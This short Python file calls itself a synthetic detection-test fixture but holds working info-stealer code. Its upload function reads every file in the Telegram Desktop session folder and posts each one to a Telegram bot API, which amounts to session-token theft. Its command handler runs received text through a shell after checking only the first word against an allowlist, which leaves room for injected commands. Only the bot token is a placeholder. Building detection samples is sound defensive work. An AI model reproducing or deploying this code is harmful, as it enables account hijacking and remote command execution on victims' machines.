# FIXTURE ONLY - synthetic detection test sample, not real malware
import os
import subprocess
import requests

TOKEN = "123456789:" + "AAF" + "x" * 32
API = "https://api.telegram.org/bot" + TOKEN
ALLOWED = {"ls", "whoami", "pwd"}


def upload_session_files(chat_id):
    base = os.path.expanduser("~/.local/share/TelegramDesktop/tdata")
    for name in os.listdir(base):
        with open(os.path.join(base, name), "rb") as fh:
            requests.post(API + "/sendDocument", data={"chat_id": chat_id}, files={"document": fh})


def handle_command(text):
    cmd = text.split()[0]
    if cmd in ALLOWED:
        return subprocess.run(text, shell=True, capture_output=True, text=True).stdout
